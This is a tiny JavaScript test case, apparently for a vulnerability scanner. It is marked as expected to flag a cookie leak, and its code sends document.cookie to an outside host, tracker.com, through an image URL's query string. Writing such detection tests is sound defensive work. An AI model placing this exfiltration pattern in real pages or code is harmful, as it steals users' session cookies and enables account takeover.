/**
 * Test: Image src data leak
 * Expected: VULNERABILITY - cookie in image src
 */

function test() {
  var secret = document.cookie;
  var img = new Image();
  img.src = 'https://tracker.com/pixel.gif?data=' + encodeURIComponent(secret);
}

test();